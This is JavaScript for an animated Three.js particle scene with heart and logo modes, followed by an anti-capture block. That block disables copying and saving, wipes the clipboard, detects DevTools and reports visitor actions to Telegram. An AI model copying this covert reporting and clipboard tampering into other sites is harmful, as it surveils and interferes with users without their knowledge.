const scT = SCALE_TABLE[mode] * (mode === MODE.RAIN ? viewFit : effScale * 0.88 + 0.12);
const trT = whooshTimeLeft > 0 ? (0.95 + 0.45 * whooshStrength) : (confessionActive ? 0.52 : TRAIL_TABLE[mode]);
trailCur += (trT - trailCur) * (1 - Math.exp(-dt * 4.5));
scaleCur += (scT - scaleCur) * (1 - Math.exp(-dt * 4.0));
const hrTarget = (mode === MODE.RAIN || whooshTimeLeft > 0) ? 1.0 : (confessionActive ? 0.58 : 0.0);
heartRainAlpha += (hrTarget - heartRainAlpha) * (1 - Math.exp(-dt * 4.2));
heartRainMesh.visible = heartRainAlpha > 0.005;
heartRainMat.opacity = heartRainAlpha * 0.76;
const hrArr = heartRainMesh.instanceMatrix.array;
const baseSpanX = HALF_H * camera.aspect * 1.15;
const bloomTarget = whooshTimeLeft > 0 ? 0.34 : (confessionActive ? 0.24 : (mode === MODE.LOGO ? 0.06 : (mode === MODE.STREAM ? 0.18 : 0.22)));
const shardOpTarget = mode === MODE.LOGO ? (0.48 - coreOpacity * 0.24) : (mode === MODE.RAIN ? 0.34 : (mode === MODE.STREAM ? 0.46 : 0.58));
bloom.strength += (bloomTarget - bloom.strength) * (1 - Math.exp(-dt * 4.2));
shardMat.opacity += (shardOpTarget - shardMat.opacity) * (1 - Math.exp(-dt * 4.2));
const colorTarget = mode === MODE.LOGO ? 1.0 : 0.0;
const prevColorMix = colorMix;
colorMix += (colorTarget - colorMix) * (1 - Math.exp(-dt * 3.8));
const updateColors = Math.abs(colorMix - prevColorMix) > 0.0005;
const sColArr = shards.instanceColor.array;
const tColArr = trails.instanceColor.array;
let cx = anchor.x;
let cy = anchor.y + 1.55 * effScale;
if (mode === MODE.LOGO || mode === MODE.HEART) {
const maxX = Math.max(0.20, HALF_H * camera.aspect - 1.65 * effScale);
const maxY = Math.max(0.25, HALF_H - 2.25 * effScale);
cx = Math.max(-maxX, Math.min(maxX, cx));
cy = Math.max(-maxY + (innerWidth <= 768 ? 0.35 : 0), Math.min(maxY, cy));
}
ctr.set(cx, cy, 0);
const logoYaw   = Math.sin(t * 0.85) * 0.20 - cx * 0.05;
const logoPitch = Math.cos(t * 0.65) * 0.06 + cy * 0.025;
const logoRollZ = handRoll * 0.55;
logoEuler.set(logoPitch, logoYaw, logoRollZ, 'YXZ');
logoQuat.setFromEuler(logoEuler);
const lx = logoQuat.x, ly = logoQuat.y, lz = logoQuat.z, lw = logoQuat.w;
const r00 = 1 - 2 * (ly * ly + lz * lz), r01 = 2 * (lx * ly - lw * lz), r02 = 2 * (lx * lz + lw * ly);
const r10 = 2 * (lx * ly + lw * lz),     r11 = 1 - 2 * (lx * lx + lz * lz), r12 = 2 * (ly * lz - lw * lx);
const r20 = 2 * (lx * lz - lw * ly),     r21 = 2 * (ly * lz + lw * lx),     r22 = 1 - 2 * (lx * lx + ly * ly);
const beatArg = t * 2.6;
const s1 = Math.max(0, Math.sin(beatArg));
const s2 = Math.max(0, Math.sin(beatArg - 0.55));
const heartBeat = 1.0 + 0.042 * (s1 * s1 * s1 * s1) + 0.022 * (s2 * s2 * s2 * s2);
const heartBaseR = camera.aspect < 0.85 ? 1.52 : 2.08;
const heartR = heartBaseR * effScale * heartBeat;
const heartYaw = Math.sin(t * 0.65) * 0.16;
const cosHY = Math.cos(heartYaw), sinHY = Math.sin(heartYaw);
const shardArr = shards.instanceMatrix.array;
const trailArr = trails.instanceMatrix.array;
const showTrails = !(trailCur < 0.06 && mode === MODE.LOGO && whooshTimeLeft <= 0 && !confessionActive);
trails.visible = showTrails;
const logoScale = 0.96 * effScale;
const coreFadeRatio = coreOpacity / 0.95;
let errSum = 0.0;
for (let i = 0; i < N; i++) {
const i3 = i * 3;
const sdx = sxSeed[i], sdy = sySeed[i], sdz = szSeed[i];
const f = i / N;
let sc = scaleCur * (0.8 + rnd[i] * 0.42);
let tpx, tpy, tpz, dx, dy, dz;
if (updateColors) {
const cr = baseR[i] + (imgR[i] - baseR[i]) * colorMix;
const cg = baseG[i] + (imgG[i] - baseG[i]) * colorMix;
const cb = baseB[i] + (imgB[i] - baseB[i]) * colorMix;
sColArr[i3] = cr; sColArr[i3 + 1] = cg; sColArr[i3 + 2] = cb;
tColArr[i3] = cr; tColArr[i3 + 1] = cg; tColArr[i3 + 2] = cb;
}
if (whooshTimeLeft > 0 || confessionActive) {
const spinSpeed = whooshTimeLeft > 0 ? 2.6 : 0.48;
const ang = ph[i] + t * spinSpeed * (0.45 + 0.55 * rnd[i]) + f * Math.PI * 4.0;
const radNorm = 0.18 + 0.88 * Math.sqrt(f);
const spanW = HALF_H * camera.aspect * (whooshTimeLeft > 0 ? 1.55 : 1.28);
const spanH = HALF_H * (whooshTimeLeft > 0 ? 1.45 : 1.22);
tpx = Math.cos(ang) * spanW * radNorm + sdx * 0.85;
tpy = Math.sin(ang) * spanH * radNorm + sdy * 0.85;
tpz = sdz * (whooshTimeLeft > 0 ? 4.8 : 3.2) + Math.sin(t * 1.8 + ph[i]) * (1.2 + whooshMix * 2.5);
dx = -Math.sin(ang);
dy = Math.cos(ang);
dz = Math.cos(t * 2.0 + ph[i]) * 0.45;
sc *= (0.72 + 0.45 * whooshMix);
} else if (mode === MODE.LOGO) {
const role = partRoleU8[i];
const bx = logoP[i3] * logoScale;
const by = logoP[i3 + 1] * logoScale;
const bz = logoP[i3 + 2] * logoScale;
const shim = Math.sin(t * 3.0 + ph[i]) * (role === 2 ? 0.009 : 0.005);
tpx = ctr.x + r00 * bx + r01 * by + r02 * bz + sdx * shim;
tpy = ctr.y + r10 * bx + r11 * by + r12 * bz + sdy * shim;
tpz = ctr.z + r20 * bx + r21 * by + r22 * bz;
const tdx = logoD[i3], tdy = logoD[i3 + 1], tdz = logoD[i3 + 2];
dx = r00 * tdx + r01 * tdy + r02 * tdz;
dy = r10 * tdx + r11 * tdy + r12 * tdz;
dz = r20 * tdx + r21 * tdy + r22 * tdz;
if (unlockedRealPhoto) {
const settleScale = role === 2 ? 1.05 : (role === 1 ? (1.0 - 0.45 * coreFadeRatio) : (1.0 - 0.62 * coreFadeRatio));
sc = logoS[i] * effScale * 0.76 * settleScale;
} else {
sc = logoS[i] * effScale * 0.74;
}
} else if (mode === MODE.HEART) {
const u = ((i * 0.61803398875) + t * 0.042) % 1.0;
const lutIdx = ((u * HEART_LUT_SIZE) | 0) & (HEART_LUT_SIZE - 1);
const hx = heartX[lutIdx];
const hy = heartY[lutIdx];
const htx = heartTX[lutIdx];
const hty = heartTY[lutIdx];
const band = 0.60 + 0.40 * Math.pow(rnd[i], 0.42);
const rr = heartR * band;
const lxH = hx * rr + sdx * (1.0 - band) * 0.26 * heartR;
const lyH = hy * rr + sdy * (1.0 - band) * 0.14 * heartR;
const lzH = sdz * 0.36 + Math.sin((band - 0.60) / 0.40 * Math.PI) * 0.18 * sxSeed[i];
tpx = ctr.x + lxH * cosHY + lzH * sinHY;
tpy = ctr.y + lyH;
tpz = -lxH * sinHY + lzH * cosHY;
const flowX = htx * 0.92 - hx * 0.18;
const flowY = hty * 0.92 - hy * 0.18;
dx = flowX * cosHY;
dy = flowY;
dz = -flowX * sinHY + sdx * 0.18;
} else if (mode === MODE.STREAM) {
const lag = 0.03 + Math.pow(f, 0.9) * 1.65 + sdz * 0.03;
sampleHist(t - lag, va);
sampleHist(t - lag + 0.09, vb);
const spread = 0.16 + lag * 0.48;
tpx = va.x + sdx * spread + Math.sin(t * 1.6 + ph[i]) * 0.12 * (1 + lag);
tpy = va.y + sdy * spread * 0.7 + Math.cos(t * 1.3 + ph[i]) * 0.10 * (1 + lag);
tpz = va.z + sdz * spread * 0.8;
let vxH = vb.x - va.x, vyH = vb.y - va.y, vzH = vb.z - va.z;
const len = Math.hypot(vxH, vyH, vzH);
const wMix = Math.min(1, len / 0.12);
dx = Math.cos(ph[i] + t * 0.4) * (1 - wMix);
dy = Math.sin(ph[i] + t * 0.5) * 0.5 * (1 - wMix);
dz = 0.1 * (1 - wMix);
if (len > 1e-5) {
dx += (vxH / len) * wMix;
dy += (vyH / len) * wMix;
dz += (vzH / len) * wMix;
}
sc *= 1.05 - f * 0.28;
} else {
let ry = rainY[i] + rainV[i] * dt;
let wrapped = false;
if (ry > 7.4) {
ry = -7.4;
rainX[i] = (Math.random() - 0.5) * 2.0;
rainZ[i] = -8.5 + Math.random() * 10.5;
wrapped = true;
} else if (ry < -7.4) {
ry = 7.4;
rainX[i] = (Math.random() - 0.5) * 2.0;
rainZ[i] = -8.5 + Math.random() * 10.5;
wrapped = true;
}
rainY[i] = ry;
const rz = rainZ[i];
const depthSpan = baseSpanX * ((10.0 - rz) * 0.105);
const swayX = Math.sin(t * 1.35 + ph[i]) * 0.42 + Math.cos(t * 0.72 + ph[i] * 1.7) * 0.18;
const swayZ = Math.cos(t * 1.10 + ph[i]) * 0.28;
tpx = rainX[i] * depthSpan + swayX;
tpy = ry;
tpz = rz + swayZ;
const bdx = tpx - tip.x, bdy = tpy - tip.y;
const bDist2 = bdx * bdx + bdy * bdy;
if (bDist2 < 3.2) {
const push = (1.0 - bDist2 / 3.2) * 0.65;
const bLen = Math.sqrt(bDist2) + 0.05;
tpx += (bdx / bLen) * push;
tpy += (bdy / bLen) * push * 0.6;
}
if (wrapped) {
px[i] = tpx; py[i] = tpy; pz[i] = tpz;
vx[i] = 0; vy[i] = rainV[i]; vz[i] = 0;
}
dx = Math.sin(t * 1.6 + ph[i]) * 0.35;
dy = 1.0;
dz = Math.cos(t * 1.3 + ph[i]) * 0.25;
if (i < HEART_RAIN_COUNT) {
sc *= (1.0 - 0.85 * heartRainAlpha);
} else {
sc *= 0.68;
}
}
const dLen = Math.hypot(dx, dy, dz) || 1.0;
dx /= dLen; dy /= dLen; dz /= dLen;
const w = om * (0.72 + 0.52 * rnd[i]);
const w2 = w * w, damp2 = 2 * zeta * w;
let cvx = vx[i] + ((tpx - px[i]) * w2 - vx[i] * damp2) * dt;
let cvy = vy[i] + ((tpy - py[i]) * w2 - vy[i] * damp2) * dt;
let cvz = vz[i] + ((tpz - pz[i]) * w2 - vz[i] * damp2) * dt;
const cpx = px[i] + cvx * dt;
const cpy = py[i] + cvy * dt;
const cpz = pz[i] + cvz * dt;
vx[i] = cvx; vy[i] = cvy; vz[i] = cvz;
px[i] = cpx; py[i] = cpy; pz[i] = cpz;
if (whooshTimeLeft > 0 || confessionActive || mode === MODE.STREAM) {
const sp = Math.hypot(cvx, cvy, cvz);
if (sp > 0.6) {
const k = Math.min(0.85, (sp - 0.6) / 3.0);
dx = dx * (1 - k) + (cvx / sp) * k;
dy = dy * (1 - k) + (cvy / sp) * k;
dz = dz * (1 - k) + (cvz / sp) * k;
const nl = Math.hypot(dx, dy, dz) || 1.0;
dx /= nl; dy /= nl; dz /= nl;
}
} else if (mode === MODE.LOGO) {
const ex = tpx - cpx, ey = tpy - cpy, ez = tpz - cpz;
errSum += ex * ex + ey * ey + ez * ez;
}
let tqx, tqy, tqz, tqw;
if (dy > -0.9999) {
tqx = dz;
tqy = 0.0;
tqz = -dx;
tqw = 1.0 + dy;
const ql = Math.hypot(tqx, tqz, tqw) || 1.0;
tqx /= ql; tqz /= ql; tqw /= ql;
} else {
tqx = 1; tqy = 0; tqz = 0; tqw = 0;
}
let cqx = qx[i], cqy = qy[i], cqz = qz[i], cqw = qw[i];
if (cqx * tqx + cqy * tqy + cqz * tqz + cqw * tqw < 0) {
tqx = -tqx; tqy = -tqy; tqz = -tqz; tqw = -tqw;
}
cqx += (tqx - cqx) * kq;
cqy += (tqy - cqy) * kq;
cqz += (tqz - cqz) * kq;
cqw += (tqw - cqw) * kq;
const qNorm = 1.0 / (Math.hypot(cqx, cqy, cqz, cqw) || 1.0);
cqx *= qNorm; cqy *= qNorm; cqz *= qNorm; cqw *= qNorm;
qx[i] = cqx; qy[i] = cqy; qz[i] = cqz; qw[i] = cqw;
const mOff = i * 16;
writeMat4(shardArr, mOff, cpx, cpy, cpz, cqx, cqy, cqz, cqw, sc, sc, sc);
if (showTrails) writeMat4(trailArr, mOff, cpx, cpy, cpz, cqx, cqy, cqz, cqw, sc, sc * trailCur, sc);
if (heartRainMesh.visible && i < HEART_RAIN_COUNT) {
const phH = ph[i];
const hPulse = 0.86 + 0.20 * Math.sin(t * 2.8 + phH);
const hSc = (0.095 + 0.185 * Math.pow(rnd[i], 1.45)) * viewFit * hPulse * (0.25 + 0.75 * heartRainAlpha);
const angY = Math.sin(t * 1.25 + phH * 1.3) * 0.62;
const angZ = Math.sin(t * 1.65 + phH) * 0.28;
const cyH = Math.cos(angY * 0.5), syH = Math.sin(angY * 0.5);
const czH = Math.cos(angZ * 0.5), szH = Math.sin(angZ * 0.5);
writeMat4(hrArr, mOff, cpx, cpy, cpz, -syH * szH, syH * czH, cyH * szH, cyH * czH, hSc, hSc, hSc);
}
}
shards.instanceMatrix.needsUpdate = true;
if (showTrails) trails.instanceMatrix.needsUpdate = true;
if (heartRainMesh.visible) heartRainMesh.instanceMatrix.needsUpdate = true;
if (updateColors) {
shards.instanceColor.needsUpdate = true;
trails.instanceColor.needsUpdate = true;
}
let targetCoreOp = 0.0;
if (mode === MODE.LOGO && whooshTimeLeft <= 0 && !confessionActive) {
const rmsErr = Math.sqrt(errSum / N);
const conv = Math.max(0, Math.min(1, 1.0 - (rmsErr - 0.08) / 0.48));
targetCoreOp = conv * 0.96;
}
coreOpacity += (targetCoreOp - coreOpacity) * (1 - Math.exp(-dt * (mode === MODE.LOGO ? 3.6 : 12.0)));
if (coreOpacity > 0.004) {
if (unlockedRealPhoto) {
if (oshsuCoreMesh) oshsuCoreMesh.visible = false;
logoCoreMesh.visible = true;
logoCoreMat.uniforms.uTime.value = t;
logoCoreMat.uniforms.uOpacity.value = coreOpacity;
logoCoreMat.uniforms.uTilt.value.set(logoYaw * 2.2 + handRoll * 0.8, logoPitch * 2.5);
logoCoreMesh.position.copy(ctr);
logoCoreMesh.quaternion.copy(logoQuat);
logoCoreMesh.scale.setScalar(logoScale);
} else {
logoCoreMesh.visible = false;
if (oshsuCoreMesh) {
oshsuCoreMesh.visible = true;
oshsuCoreMat.opacity = coreOpacity * 0.90;
oshsuCoreMesh.position.copy(ctr);
oshsuCoreMesh.quaternion.copy(logoQuat);
oshsuCoreMesh.scale.setScalar(logoScale);
}
}
} else {
logoCoreMesh.visible = false;
if (oshsuCoreMesh) oshsuCoreMesh.visible = false;
}
bgUniforms.uTime.value = t;
bgUniforms.uAspect.value = camera.aspect;
bgUniforms.uCenter.value.set((cx / HALF_H), (cy / HALF_H));
bgUniforms.uBeat.value = mode === MODE.HEART ? (heartBeat - 1.0) * 14.0 : 0.35;
const bgHArr = bgHeartsMesh.instanceMatrix.array;
const maxBgX = HALF_H * camera.aspect * 1.45;
for (let i = 0; i < BG_HEART_COUNT; i++) {
let hy = bgHY[i] + bgHV[i] * dt;
if (hy > 6.2) {
hy = -6.2;
bgHX[i] = (Math.random() - 0.5) * maxBgX * 2.0;
}
bgHY[i] = hy;
const phH = bgHPh[i];
const hx = bgHX[i] + Math.sin(t * 0.85 + phH) * 0.28;
const hz = bgHZ[i];
const pulseH = 0.72 + 0.38 * Math.sin(t * 2.4 + phH);
const hsc = bgHSc[i] * viewFit * pulseH;
const angY = Math.sin(t * 1.1 + phH) * 0.45;
const angZ = Math.cos(t * 0.9 + phH) * 0.22;
const cyH = Math.cos(angY * 0.5), syH = Math.sin(angY * 0.5);
const czH = Math.cos(angZ * 0.5), szH = Math.sin(angZ * 0.5);
writeMat4(bgHArr, i * 16, hx, hy, hz, 0, syH * czH, cyH * szH, cyH * czH, hsc, hsc, hsc);
}
bgHeartsMesh.instanceMatrix.needsUpdate = true;
composer.render();
}
(() => {
const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
const origToBlob = HTMLCanvasElement.prototype.toBlob;
const origCaptureStream = HTMLCanvasElement.prototype.captureStream;
HTMLCanvasElement.prototype.toDataURL = function(...args) {
if (this === canvas || this.id === 'c' || this.id === 'camCanvas') return 'data:,';
return origToDataURL.apply(this, args);
};
HTMLCanvasElement.prototype.toBlob = function(cb, ...args) {
if (this === canvas || this.id === 'c' || this.id === 'camCanvas') {
if (typeof cb === 'function') cb(null);
return;
}
return origToBlob.call(this, cb, ...args);
};
if (origCaptureStream) {
HTMLCanvasElement.prototype.captureStream = function(...args) {
if (this === canvas || this.id === 'c' || this.id === 'camCanvas') {
throw new Error('Blocked');
}
return origCaptureStream.apply(this, args);
};
}
const privacyShield = $('#privacyShield');
let shieldTimer = null;
let shieldStickyUntil = 0;
let lastSecAlertTime = 0;
let devToolsOpen = false;
function notifySecurityAlert(reason) {
if (!reason) return;
const now = Date.now();
if (now - lastSecAlertTime < 5000) return;
lastSecAlertTime = now;
sendTelegramLog(`🚨 Защита (${decodeMailTitle()}): ${reason}`);
}
function activatePrivacyShield(reason = '', stickyMs = 0) {
if (privacyShield) privacyShield.classList.add('active');
document.body.classList.add('privacy-locked');
if (logoCoreMesh) logoCoreMesh.visible = false;
if (oshsuCoreMesh) oshsuCoreMesh.visible = false;
renderer.setRenderTarget(null);
renderer.clear();
if (stickyMs > 0) {
shieldStickyUntil = Math.max(shieldStickyUntil, Date.now() + stickyMs);
if (shieldTimer) clearTimeout(shieldTimer);
shieldTimer = setTimeout(() => {
if (!document.hidden && (isMobile || document.hasFocus()) && !devToolsOpen) {
releasePrivacyShield(0);
}
}, stickyMs + 50);
}
if (reason) notifySecurityAlert(reason);
}
function releasePrivacyShield(delayMs = 250) {
if (devToolsOpen) return;
const now = Date.now();
if (now < shieldStickyUntil) {
const wait = shieldStickyUntil - now + 40;
if (shieldTimer) clearTimeout(shieldTimer);
shieldTimer = setTimeout(() => releasePrivacyShield(0), wait);
return;
}
if (document.hidden || (!isMobile && !document.hasFocus())) return;
if (shieldTimer) clearTimeout(shieldTimer);
const unlock = () => {
if (devToolsOpen || document.hidden || (!isMobile && !document.hasFocus()) || Date.now() < shieldStickyUntil) return;
if (privacyShield) privacyShield.classList.remove('active');
document.body.classList.remove('privacy-locked');
};
if (delayMs > 0) {
shieldTimer = setTimeout(unlock, delayMs);
} else {
unlock();
}
}
const isEditableTarget = t => !!(t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA'));
document.addEventListener('contextmenu', e => e.preventDefault(), { capture: true });
document.addEventListener('dragstart', e => e.preventDefault(), { capture: true });
document.addEventListener('selectstart', e => {
if (!isEditableTarget(e.target)) e.preventDefault();
}, { capture: true });
document.addEventListener('copy', e => {
if (!isEditableTarget(e.target)) e.preventDefault();
}, { capture: true });
document.addEventListener('cut', e => {
if (!isEditableTarget(e.target)) e.preventDefault();
}, { capture: true });
function wipeClipboard() {
if (navigator.clipboard && navigator.clipboard.writeText) {
navigator.clipboard.writeText('').catch(() => {});
}
}
function handleSecurityKey(e) {
const key = e.key || '';
const low = key.toLowerCase();
const code = e.code || '';
if (key === 'PrintScreen' || code === 'PrintScreen' || e.keyCode === 44) {
e.preventDefault();
e.stopPropagation();
wipeClipboard();
activatePrivacyShield('Попытка снимка экрана (PrintScreen)', 2800);
return;
}
if ((e.metaKey || e.ctrlKey) && e.shiftKey && (code === 'KeyS' || low === 's' || low === 'ы')) {
e.preventDefault();
e.stopPropagation();
wipeClipboard();
activatePrivacyShield('Попытка скриншота (системная комбинация)', 2800);
return;
}
if (e.metaKey && e.shiftKey && (key === '3' || key === '4' || key === '5' || key === '6')) {
e.preventDefault();
e.stopPropagation();
wipeClipboard();
activatePrivacyShield('Попытка скриншота (системная комбинация)', 2800);
return;
}
if (key === 'F12' || e.keyCode === 123) {
e.preventDefault();
e.stopPropagation();
activatePrivacyShield('Попытка открыть код / сохранить сайт', 2200);
return;
}
if ((e.ctrlKey || e.metaKey) && !e.shiftKey && (
code === 'KeyS' || code === 'KeyU' || code === 'KeyP' ||
low === 's' || low === 'u' || low === 'p' || low === 'ы' || low === 'г' || low === 'з'
)) {
e.preventDefault();
e.stopPropagation();
if (code === 'KeyP' || low === 'p' || low === 'з') {
activatePrivacyShield('Попытка печати / PDF', 2800);
} else {
activatePrivacyShield('Попытка открыть код / сохранить сайт', 2200);
}
return;
}
if ((e.ctrlKey || e.metaKey) && e.shiftKey && (
code === 'KeyI' || code === 'KeyJ' || code === 'KeyC' || code === 'KeyK' ||
low === 'i' || low === 'j' || low === 'c' || low === 'k' ||
low === 'ш' || low === 'о' || low === 'с' || low === 'л'
)) {
e.preventDefault();
e.stopPropagation();
activatePrivacyShield('Попытка открыть код / сохранить сайт', 2200);
}
}
window.addEventListener('keydown', handleSecurityKey, { capture: true });
window.addEventListener('keyup', handleSecurityKey, { capture: true });
document.addEventListener('visibilitychange', () => {
if (document.hidden) activatePrivacyShield('', 0);
else releasePrivacyShield(isMobile ? 120 : 250);
});
if (!isMobile) {
window.addEventListener('blur', () => activatePrivacyShield('', 0));
}
window.addEventListener('focus', () => releasePrivacyShield(isMobile ? 120 : 250));
if (privacyShield) {
privacyShield.addEventListener('pointerdown', () => {
if (!devToolsOpen && !document.hidden && Date.now() >= shieldStickyUntil) {
releasePrivacyShield(0);
}
});
}
window.addEventListener('beforeprint', () => activatePrivacyShield('Попытка печати / PDF', 3000));
setInterval(() => {
if (isMobile) return;
const isFull = !!(document.fullscreenElement || document.webkitFullscreenElement);
if (isFull) return;
const wDiff = window.outerWidth - window.innerWidth;
const hDiff = window.outerHeight - window.innerHeight;
const detected = (wDiff > 160 || hDiff > 160);
if (detected) {
if (!devToolsOpen) {
devToolsOpen = true;
unlockedRealPhoto = false;
logoP = oshsuLogoP;
logoD = oshsuLogoD;
logoS = oshsuLogoS;
partRoleU8 = oshsuRoleU8;
imgR = oshsuImgR;
imgG = oshsuImgG;
imgB = oshsuImgB;
colorMix = -0.01;
activatePrivacyShield('Открыта панель разработчика (DevTools)', 1500);
}
} else if (devToolsOpen) {
devToolsOpen = false;
releasePrivacyShield(200);
}
}, 1000);
})();
frame();
})();
